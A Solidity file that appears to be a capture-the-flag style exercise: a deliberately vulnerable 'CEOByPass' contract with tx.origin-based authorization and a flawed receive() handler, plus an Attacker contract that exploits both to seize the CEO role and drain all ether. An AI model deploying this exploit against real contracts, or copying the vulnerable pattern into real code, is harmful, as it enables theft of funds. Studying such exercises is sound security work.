// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

contract CEOByPass {
    mapping(address => uint) public wallet;
    address payable public ceo;

    constructor() public {
        ceo = payable(msg.sender);
        wallet[ceo] = 10000 * (1 ether);
    }

    modifier onlyCEO() {
        require(tx.origin == ceo);
        _;
    }

    function addToMyWallet() public payable {
        require(tx.origin != msg.sender);
        require(msg.value <= 0.1 ether);
        wallet[ceo] += msg.value;
        if (wallet[tx.origin] > wallet[ceo]) ceo = payable(tx.origin);
    }

    function getMyWallet() public view returns (uint) {
        return wallet[tx.origin];
    }

    function withdrawCEOWallet() public onlyCEO {
        ceo.transfer(address(this).balance);
    }

    receive() external payable {
        require(msg.value > 0 && wallet[ceo] > 10000 ether);
        ceo = payable(tx.origin);
    }
}

contract Attacker {
    CEOByPass original;

    constructor(CEOByPass _address) public {
        original = _address;
    }

    // function addToCEOWallet() public payable {
    //     original.addToMyWallet{value: msg.value}();
    // }

    // function triggerRecieve(address payable _target) public payable {
    //     _target.call{value: msg.value}("");
    // }

    // function withdrawCEOWallet(address payable _target) public payable{
    //     original.withdrawCEOWallet();
    // }

    function withdrawCEOWallet(address payable _target) public payable {
        original.addToMyWallet{value: 0.001 ether}();
        _target.call{value: 0.001 ether}("");
        original.withdrawCEOWallet();
    }
}
